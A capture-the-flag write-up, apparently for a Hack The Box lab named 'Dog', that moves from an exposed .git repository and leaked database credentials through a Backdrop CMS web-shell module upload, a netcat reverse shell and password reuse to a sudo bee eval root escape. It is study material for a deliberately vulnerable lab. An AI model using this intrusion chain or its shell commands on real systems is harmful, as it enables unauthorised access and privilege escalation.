## Dog

### Lab Details 

- Difficulty: Easy
- Type: Web App, Backdrop CMS,  Linux

#### Tasks

Q1: How many open TCP ports are listening on Dog?
- run nmap
```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEJsqBRTZaxqvLcuvWuqOclXU1uxwUJv98W1TfLTgTYqIBzWAqQR7Y6fXBOUS6FQ9xctARWGM3w3AeDw+MW0j+iH83gc9J4mTFTBP8bXMgRqS2MtoeNgKWozPoy6wQjuRSUammW772o8rsU2lFPq3fJCoPgiC7dR4qmrWvgp5TV8GuExl7WugH6/cTGrjoqezALwRlKsDgmAl6TkAaWbCC1rQ244m58ymadXaAx5I5NuvCxbVtw32/eEuyqu+bnW8V2SdTTtLCNOe1Tq0XJz3mG9rw8oFH+Mqr142h81jKzyPO/YrbqZi2GvOGF+PNxMg+4kWLQ559we+7mLIT7ms0esal5O6GqIVPax0K21+GblcyRBCCNkawzQCObo5rdvtELh0CPRkBkbOPo4CfXwd/DxMnijXzhR/lCLlb2bqYUMDxkfeMnmk8HRF+hbVQefbRC/+vWf61o2l0IFEr1IJo3BDtJy5m2IcWCeFX3ufk5Fme8LTzAsk6G9hROXnBZg8=
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM/NEdzq1MMEw7EsZsxWuDa+kSb+OmiGvYnPofRWZOOMhFgsGIWfg8KS4KiEUB2IjTtRovlVVot709BrZnCvU8Y=
|   256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPMpkoATGAIWQVbEl67rFecNZySrzt944Y/hWAyq4dPc
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 22 disallowed entries 
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
| /user/password /user/login /user/logout /?q=admin /?q=comment/reply 
| /?q=filter/tips /?q=node/add /?q=search /?q=user/password 
|_/?q=user/register /?q=user/login /?q=user/logout
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Home | Dog
| http-git: 
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
|_http-favicon: Unknown favicon MD5: 3836E83A3E835A26D789DDA9E78C5510
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

Q2: What is the name of the directory on the root of the webserver that leaks the full source code of the application?
- normally git directory contains source code of application
- check `/.git`
![[git directory.png]]

Q3: What is the CMS used to make the website on Dog? Include a space between two words.
- to check for what CMS application is installed first we need to fetch the git repo from server 
- theres many ways to do it i.e. `wget` or custom tools like `git-dumper`
```
$ ./gitdumper.sh http://10.10.11.58/.git/ dump
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating dump/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
<snip>
```
- nothing interesting in git log, checked for git restore to redo previous actions 
```
$ git log 
commit 8204779c764abd4c9d8d95038b6d22b6a7515afa (HEAD -> master)
Author: root <dog@dog.htb>
Date:   Fri Feb 7 21:22:11 2025 +0000

    todo: customize url aliases.  reference:https://docs.backdropcms.org/documentation/url-aliases
$ git restore . ## need to restore from the parent directory where .git resides not in the .git directory
```
Q4: What is the password the application uses to connect to the database?
- by scanning through the files `settings.php` contains connection details to `mysql` database
```
$ cat settings.php                        
<?php
/**
 * @file
 * Main Backdrop CMS configuration file.
 */

/**
 * Database configuration:
 *
 * Most sites can configure their database by entering the connection string
 * below. If using primary/replica databases or multiple connections, see the
 * advanced database documentation at
 * https://api.backdropcms.org/database-configuration
 */
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
$database_prefix = '';

```
Q5: What user uses the DB password to log into the admin functionality of Backdrop CMS?
- from `git log` we can see that the user is who commit the change ends with `@dog.htb`
- we can try search for the suffix 
```
$ grep -r "@dog"           
.git/logs/HEAD:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> 1738963331 +0000    commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases
.git/logs/refs/heads/master:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> 1738963331 +0000       commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases
files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"
```
Q6: What system user is the Backdrop CMS instance running as on Dog?
- after obtaining both the username and the password we can attempt to login the to the application with found credentials
- first need to confirm the version of the backdrop
- version is 1.27.1
![[version check.png]]
- search for backdrop CMS 1.27.1 vulnerability and found https://www.exploit-db.com/exploits/52021
- looking through the code, doesnt seem to perform authentication and running it doesnt work 
- however the code does mention we can perform the attack manually
- in Functionality -> Install New Module and Manual install 
- the exploit does generate the payload we can use to install to CMS however to need to archive it using `tar`
```
$ tar -czf shell.tar.gz shell
```
- select `Upload a module...` option and upload the archived shell directory 
- access the web shell via `/modules/shell/shell.php` 
![[Pasted image 20250718215903.png]]
- load a revershell and run `whoami`
```
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.20] from (UNKNOWN) [10.10.11.58] 41534
$ whoami  
whoami
www-data
<snip>
```
Q7: What system user on Dog shares the same DB password?
- check users in `/etc/passwd`
- found two user with login shell 
- try credential reuse on user `johncusack` and worked 
```
johncusack@dog:~$ pwd
/home/johncusack
johncusack@dog:~$ ls
user.txt
<snip>
```
Q9: What is the full path of the binary that the johncusack user can run as any user on Dog?
- run `sudo -l`
```
johncusack@dog:~$ sudo -l
[sudo] password for johncusack: 
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

Q10&11: 
- Skipped got root access by running `bee` as root
- Priv Esc found https://www.hackingdream.net/2020/03/linux-privilege-escalation-techniques.html
```
Priv Esc When bee can run without password 

#BackDrop CMS 
sudo bee eval "system('/bin/bash');"

#In case of `The required bootstrap level for 'eval' is not ready.` Error
#Find the application path  - generally in /var/www/html
sudo /usr/local/bin/bee --root=/var/www/html eval "system('/bin/bash');"
```
#### Resources
- Privilege escalation techniques: https://www.hackingdream.net/2020/03/linux-privilege-escalation-techniques.html
- RCE exploit for Backdrop: https://www.exploit-db.com/exploits/52021
#### Lesson Learned
 - Lateral movement try credential/password reuse
